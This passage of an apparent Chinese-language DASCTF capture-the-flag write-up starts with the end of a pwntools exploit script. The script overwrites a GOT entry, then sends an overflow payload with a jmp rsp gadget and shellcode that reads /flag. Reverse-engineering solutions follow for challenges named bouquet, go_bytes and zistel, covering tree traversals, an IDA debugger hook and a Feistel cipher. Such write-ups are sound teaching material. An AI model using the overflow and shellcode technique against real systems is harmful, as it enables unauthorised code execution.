<span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Tell me the location of the Eye of the Deep Sea</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s2">"a"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stack_chk_fail_got</span><span class="p">))</span>

<span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">"I have magic</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4008EF</span><span class="p">))</span>

<span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Let's go!</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">openat</span><span class="p">(</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span><span class="s2">"/flag"</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">sendfile</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"a"</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span><span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>

<span class="c1"># gdb.attach(io)</span>
<span class="n">s</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">itr</span><span class="p">()</span>
</pre></div>
<p>DASCTF{06678321764964616748335726574063}</p>
<h2 data-content="1" id="b13c6744ecbdebc8805920ac8125cc3f">REVERSE</h2>
<h3 data-content="1" id="a9a980a0434cc459c7f827ec3ce73bb5">bouquet</h3>
<p>根据题目意思知道有中序，后序和层次遍历</p>
<p>修一下花指令</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776222945-9ff93591-8a18-430b-abb9-a6ce7e6b12ae.png"/></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776223184-e65d067b-4a2e-40ad-bfac-7ca7e4f600ad.png"/></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776223368-856d7f51-14c6-4da4-b711-ad5865bb53eb.png"/></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776223588-be6129da-0a8c-44d5-b5e0-85bf1c54ce16.png"/></p>
<p>找到两个字符串</p>
<p>根据代码可以判断出第一个是中序遍历，第二个是后序遍历，第三个是层序遍历</p>
<p>所以输入用层序遍历构建二叉树，然后利用中序和后序遍历进行比较</p>
<p>利用中序密文和后序密文构建二叉树，层序遍历输出得到flag</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">deque</span>

<span class="k">def</span> <span class="nf">LevelOrder</span><span class="p">(</span><span class="n">postorder</span><span class="p">,</span> <span class="n">inorder</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">postorder</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">inorder</span><span class="p">:</span>
        <span class="k">return</span>

    <span class="k">def</span> <span class="nf">build_tree</span><span class="p">(</span><span class="n">postorder</span><span class="p">,</span> <span class="n">inorder</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">postorder</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">inorder</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">None</span>

        <span class="n">root_val</span> <span class="o">=</span> <span class="n">postorder</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">root</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'val'</span><span class="p">:</span> <span class="n">root_val</span><span class="p">,</span> <span class="s1">'left'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span> <span class="s1">'right'</span><span class="p">:</span> <span class="bp">None</span><span class="p">}</span>

        <span class="n">root_index</span> <span class="o">=</span> <span class="n">inorder</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">root_val</span><span class="p">)</span>

        <span class="n">root</span><span class="p">[</span><span class="s1">'left'</span><span class="p">]</span> <span class="o">=</span> <span class="n">build_tree</span><span class="p">(</span><span class="n">postorder</span><span class="p">[:</span><span class="n">root_index</span><span class="p">],</span> <span class="n">inorder</span><span class="p">[:</span><span class="n">root_index</span><span class="p">])</span>
        <span class="n">root</span><span class="p">[</span><span class="s1">'right'</span><span class="p">]</span> <span class="o">=</span> <span class="n">build_tree</span><span class="p">(</span><span class="n">postorder</span><span class="p">[</span><span class="n">root_index</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">inorder</span><span class="p">[</span><span class="n">root_index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:])</span>

        <span class="k">return</span> <span class="n">root</span>

    <span class="k">def</span> <span class="nf">bfs_traversal</span><span class="p">(</span><span class="n">root</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">root</span><span class="p">:</span>
            <span class="k">return</span>

        <span class="n">queue</span> <span class="o">=</span> <span class="n">deque</span><span class="p">([</span><span class="n">root</span><span class="p">])</span>
        <span class="k">while</span> <span class="n">queue</span><span class="p">:</span>
            <span class="n">node</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">popleft</span><span class="p">()</span>
            <span class="k">print</span><span class="p">(</span><span class="n">node</span><span class="p">[</span><span class="s1">'val'</span><span class="p">],</span> <span class="n">end</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">node</span><span class="p">[</span><span class="s1">'left'</span><span class="p">]:</span>
                <span class="n">queue</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">node</span><span class="p">[</span><span class="s1">'left'</span><span class="p">])</span>
            <span class="k">if</span> <span class="n">node</span><span class="p">[</span><span class="s1">'right'</span><span class="p">]:</span>
                <span class="n">queue</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">node</span><span class="p">[</span><span class="s1">'right'</span><span class="p">])</span>

    <span class="n">tree_root</span> <span class="o">=</span> <span class="n">build_tree</span><span class="p">(</span><span class="n">postorder</span><span class="p">,</span> <span class="n">inorder</span><span class="p">)</span>

    <span class="n">bfs_traversal</span><span class="p">(</span><span class="n">tree_root</span><span class="p">)</span>


<span class="n">postorder</span> <span class="o">=</span> <span class="s2">"j7aw_sC3addq4TAo}8_Fda{SD"</span>
<span class="n">inorder</span> <span class="o">=</span> <span class="s2">"ja7Cws_A3daTd4qDo8}F_Sd{a"</span>
<span class="n">LevelOrder</span><span class="p">(</span><span class="n">postorder</span><span class="p">,</span> <span class="n">inorder</span><span class="p">)</span>
</pre></div>
<h3 data-content="1" id="da1bb007004038a08212a94d2406f2fb">go_bytes</h3>
<p>主要加密就这一句</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776223727-3dd84148-b909-4524-a068-72c5eb276e35.png"/></p>
<p>(flag[i]&lt;&lt;4)|(flag[i+1]&gt;&gt;4)</p>
<p>最后还有个异或</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776223873-c1f9401d-eb0a-49f5-8c58-e8906a453f3c.png"/></p>
<p>直接用ida_dbg拿到r8和r9就行</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776224074-72777303-7adc-4b4b-8815-6b8e66e57b77.png"/></p>
<p>最后解密拿到flag</p>
<div class="highlight"><pre><span></span><span class="c1">#</span>
<span class="c1"># from ida_hexrays import *</span>
<span class="c1"># from ida_dbg import *</span>
<span class="c1"># from idaapi import *</span>
<span class="c1"># from idautils import *</span>
<span class="c1"># from idc import *</span>
<span class="c1"># from ida_kernwin import *</span>
<span class="c1"># '''自定义调试器钩子类'''</span>
<span class="c1"># r8=[]</span>
<span class="c1"># r9=[]</span>
<span class="c1"># class dbg_hooks_t(ida_dbg.DBG_Hooks):</span>
<span class="c1">#     global r8,r9</span>
<span class="c1">#     '''继承自父类DBG_Hooks'''</span>
<span class="c1">#     def __init__(self):</span>
<span class="c1">#         ida_dbg.DBG_Hooks.__init__(self)</span>
<span class="c1">#     def dbg_suspend_process(self):</span>
<span class="c1">#         if "cmp" in GetDisasm(here()):</span>
<span class="c1">#             r8.append(cpu.r8)</span>
<span class="c1">#             r9.append(cpu.r9)</span>
<span class="c1">#             print("r9=",r9)</span>
<span class="c1">#             print("r8=",r8)</span>
<span class="c1">#             continue_process()</span>
<span class="c1">#         if "jz" in GetDisasm(here()):</span>
<span class="c1">#             cpu.zf=1</span>
<span class="c1">#             continue_process()</span>
<span class="c1">#</span>
<span class="c1">#</span>
<span class="c1"># '''安装/卸载钩子'''</span>
<span class="c1"># if 'tmp_dbg_hooks' not in dir():</span>
<span class="c1">#     tmp_dbg_hooks = dbg_hooks_t()</span>
<span class="c1">#     tmp_dbg_hooks.hook()</span>
<span class="c1">#     print('[+] tmp dbg hook success')</span>
<span class="c1"># else:</span>
<span class="c1">#     tmp_dbg_hooks.unhook()</span>
<span class="c1">#     del tmp_dbg_hooks</span>
<span class="c1">#     print('[+] tmp dbg unhook success')</span>


<span class="n">r9</span><span class="o">=</span> <span class="p">[</span><span class="mi">8889</span><span class="p">,</span> <span class="mi">51704</span><span class="p">,</span> <span class="mi">35977</span><span class="p">,</span> <span class="mi">65304</span><span class="p">,</span> <span class="mi">5177</span><span class="p">,</span> <span class="mi">19978</span><span class="p">,</span> <span class="mi">10891</span><span class="p">,</span> <span class="mi">1995</span><span class="p">,</span> <span class="mi">48619</span><span class="p">,</span> <span class="mi">64171</span><span class="p">,</span> <span class="mi">16379</span><span class="p">,</span> <span class="mi">30795</span><span class="p">,</span> <span class="mi">40734</span><span class="p">,</span> <span class="mi">20459</span><span class="p">,</span> <span class="mi">19723</span><span class="p">,</span> <span class="mi">53390</span><span class="p">,</span> <span class="mi">14523</span><span class="p">,</span> <span class="mi">52142</span><span class="p">,</span> <span class="mi">53966</span><span class="p">,</span> <span class="mi">37182</span><span class="p">,</span> <span class="mi">2667</span><span class="p">,</span> <span class="mi">61499</span><span class="p">,</span> <span class="mi">20603</span><span class="p">,</span> <span class="mi">14731</span><span class="p">,</span> <span class="mi">37854</span><span class="p">,</span> <span class="mi">15566</span><span class="p">,</span> <span class="mi">17822</span><span class="p">,</span> <span class="mi">19134</span><span class="p">,</span> <span class="mi">21822</span><span class="p">,</span> <span class="mi">12654</span><span class="p">,</span> <span class="mi">13246</span><span class="p">,</span> <span class="mi">17150</span><span class="p">,</span> <span class="mi">52942</span><span class="p">,</span> <span class="mi">19934</span><span class="p">,</span> <span class="mi">38955</span><span class="p">,</span> <span class="mi">41755</span><span class="p">,</span> <span class="mi">32814</span><span class="p">,</span> <span class="mi">4846</span><span class="p">,</span> <span class="mi">63098</span><span class="p">,</span> <span class="mi">60281</span><span class="p">]</span>
<span class="n">r8</span><span class="o">=</span> <span class="p">[</span><span class="mi">8957</span><span class="p">,</span> <span class="mi">51693</span><span class="p">,</span> <span class="mi">36029</span><span class="p">,</span> <span class="mi">65325</span><span class="p">,</span> <span class="mi">5245</span><span class="p">,</span> <span class="mi">20077</span><span class="p">,</span> <span class="mi">10813</span><span class="p">,</span> <span class="mi">1965</span><span class="p">,</span> <span class="mi">48637</span><span class="p">,</span> <span class="mi">64237</span><span class="p">,</span> <span class="mi">16317</span><span class="p">,</span> <span class="mi">30765</span><span class="p">,</span> <span class="mi">40829</span><span class="p">,</span> <span class="mi">20333</span><span class="p">,</span> <span class="mi">19773</span><span class="p">,</span> <span class="mi">53421</span><span class="p">,</span> <span class="mi">14589</span><span class="p">,</span> <span class="mi">52205</span><span class="p">,</span> <span class="mi">53949</span><span class="p">,</span> <span class="mi">37165</span><span class="p">,</span> <span class="mi">2685</span><span class="p">,</span> <span class="mi">61549</span><span class="p">,</span> <span class="mi">20541</span><span class="p">,</span> <span class="mi">14765</span><span class="p">,</span> <span class="mi">37885</span><span class="p">,</span> <span class="mi">15597</span><span class="p">,</span> <span class="mi">17853</span><span class="p">,</span> <span class="mi">18989</span><span class="p">,</span> <span class="mi">21885</span><span class="p">,</span> <span class="mi">12653</span><span class="p">,</span> <span class="mi">13117</span><span class="p">,</span> <span class="mi">17069</span><span class="p">,</span> <span class="mi">52989</span><span class="p">,</span> <span class="mi">19949</span><span class="p">,</span> <span class="mi">39101</span><span class="p">,</span> <span class="mi">41773</span><span class="p">,</span> <span class="mi">32893</span><span class="p">,</span> <span class="mi">4717</span><span class="p">,</span> <span class="mi">63037</span><span class="p">,</span> <span class="mi">60333</span><span class="p">]</span>
<span class="n">enc</span><span class="o">=</span><span class="p">[</span><span class="n">r9</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">r8</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">r9</span><span class="p">))]</span>
<span class="k">print</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>



<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">((</span><span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0xf</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mi">4</span><span class="p">)),</span><span class="n">end</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>
</pre></div>
<h3 data-content="1" id="eb25a98c7cc4009fdf7bfecdddf3905d">zistel</h3>
<p>直接跟汇编复现算法，可以发现是类似sm4结构的算法，找到主要加密函数</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776224321-fff8529c-30c8-4b64-b19a-27ffd0fca661.png"/></p>
<p>二十轮Feistel 结构的加密，主要还原sub_100261b</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776224463-3bda7577-18a4-4866-94d4-c9b11fbee06f.png"/></p>
<p>动调能看到清晰的异或，和字节间的移位操作</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776224679-a5791284-c068-4299-8d52-3ca22d12c198.png"/></p>
<p>复现出算法</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776224948-0d0cd1c4-7606-472e-a6f4-0ae7ffbfa539.png"/></p>
<p>解密拿到flag</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">libnum</span>
<span class="k">def</span> <span class="nf">getlbytes</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
    <span class="n">ans</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
        <span class="n">get</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
            <span class="n">get</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
            <span class="n">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
        <span class="n">ans</span> <span class="o">+=</span> <span class="n">get</span>
    <span class="k">return</span> <span class="n">ans</span>
<span class="k">def</span> <span class="nf">getdword</span><span class="p">(</span><span class="nb">list</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s2">"little"</span><span class="p">):</span>
    <span class="n">ans</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">),</span> <span class="mi">4</span><span class="p">):</span>
        <span class="n">ans</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="nb">list</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span> <span class="n">mode</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">ans</span>
<span class="k">def</span> <span class="nf">fun</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span><span class="n">a2</span><span class="p">):</span>
    <span class="n">a2</span><span class="o">^=</span><span class="n">a1</span>
    <span class="n">temp</span><span class="o">=</span><span class="n">getlbytes</span><span class="p">([</span><span class="n">a1</span><span class="p">])</span>
    <span class="n">temp2</span><span class="o">=</span><span class="n">getlbytes</span><span class="p">([</span><span class="n">a2</span><span class="p">])</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">ecx</span><span class="o">=</span><span class="n">temp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&amp;</span><span class="mi">3</span>
        <span class="n">temp2</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">temp2</span><span class="p">[</span><span class="n">ecx</span><span class="p">]</span><span class="o">=</span><span class="n">temp2</span><span class="p">[</span><span class="n">ecx</span><span class="p">],</span><span class="n">temp2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">getdword</span><span class="p">(</span><span class="n">temp2</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">^</span><span class="n">a1</span>

<span class="n">table</span><span class="o">=</span><span class="p">[</span><span class="mh">0xBBDBD183</span><span class="p">,</span> <span class="mh">0x05340F2E</span><span class="p">,</span> <span class="mh">0xBEEFDEAD</span><span class="p">,</span> <span class="mh">0xBBDBD183</span><span class="p">,</span> <span class="mh">0x05340F2E</span><span class="p">,</span> <span class="mh">0xBEEFDEAD</span><span class="p">,</span> <span class="mh">0xBBDBD183</span><span class="p">,</span> <span class="mh">0x05340F2E</span><span class="p">,</span> <span class="mh">0xBEEFDEAD</span><span class="p">,</span> <span class="mh">0xBBDBD183</span><span class="p">,</span> <span class="mh">0x05340F2E</span><span class="p">,</span> <span class="mh">0xBEEFDEAD</span><span class="p">,</span> <span class="mh">0xBBDBD183</span><span class="p">,</span> <span class="mh">0x05340F2E</span><span class="p">,</span> <span class="mh">0xBEEFDEAD</span><span class="p">,</span> <span class="mh">0xBBDBD183</span><span class="p">,</span> <span class="mh">0x05340F2E</span><span class="p">,</span> <span class="mh">0xBEEFDEAD</span><span class="p">,</span> <span class="mh">0xBBDBD183</span><span class="p">,</span> <span class="mh">0x05340F2E</span><span class="p">]</span>
<span class="n">enc</span><span class="o">=</span><span class="p">[</span><span class="mh">0x33293158</span><span class="p">,</span> <span class="mh">0x60760211</span><span class="p">,</span> <span class="mh">0x42185F46</span><span class="p">,</span> <span class="mh">0x63746F29</span><span class="p">]</span>
<span class="c1"># test=getdword(texttoascii("11112222"))</span>
<span class="c1"># for i in range(0,len(test),2):</span>
<span class="c1">#     v10=test[i]</span>
<span class="c1">#     v11=test[i+1]</span>
<span class="c1">#     for i in range(20):</span>
<span class="c1">#         v10,v11=v11,v10^fun(table[i],v11)</span>
<span class="c1">#     print(hex(v10),hex(v11))</span>
<span class="c1">#</span>
<span class="c1"># enc=[0x635b033b,0x51693109]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">enc</span><span class="p">),</span><span class="mi">2</span><span class="p">):</span>
    <span class="n">v10</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
    <span class="n">v11</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">v10</span><span class="p">,</span><span class="n">v11</span><span class="o">=</span><span class="n">v11</span><span class="o">^</span><span class="n">fun</span><span class="p">(</span><span class="n">table</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">v10</span><span class="p">),</span><span class="n">v10</span>
    <span class="k">print</span><span class="p">(</span><span class="n">libnum</span><span class="o">.</span><span class="n">n2s</span><span class="p">(</span><span class="n">v10</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="n">end</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">libnum</span><span class="o">.</span><span class="n">n2s</span><span class="p">(</span><span class="n">v11</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="n">end</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>
</pre></div>
&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;</div>
</div>